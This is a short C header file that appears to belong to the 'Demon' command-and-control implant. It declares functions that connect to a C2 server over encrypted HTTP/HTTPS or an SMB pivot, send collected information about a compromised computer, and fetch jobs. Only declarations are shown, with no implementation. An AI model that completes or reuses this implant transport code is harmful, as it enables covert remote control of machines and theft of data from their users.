#ifndef DEMON_INTERNET_H
#define DEMON_INTERNET_H

#include <Core/Package.h>
#include <Core/TransportHttp.h>
#include <Core/TransportSmb.h>

/*!
 * Initialize HTTP/HTTPS Connection to C2 Server + using AES encryption or
 * Initializes a connection to the parent pivot over SMB + using AES encryption
 * and send the collected user/computer info about the compromised Computer
 * @return Return if functions ran successful
 */
BOOL TransportInit();

/*!
 * Send our specified data + encrypt it with random key
 * @param Data Data we want to send
 * @param Size Size of Data we want to send
 * @return Return if functions ran successful
 */
BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize );

/*!
 * Try get a Job by reading from the pipe
 * @param Data Data we want to read
 * @param Size Size of Data we want to read
 * @return Return if functions ran successful
 */
BOOL SMBGetJob( PVOID* RecvData, PSIZE_T RecvSize );

#endif
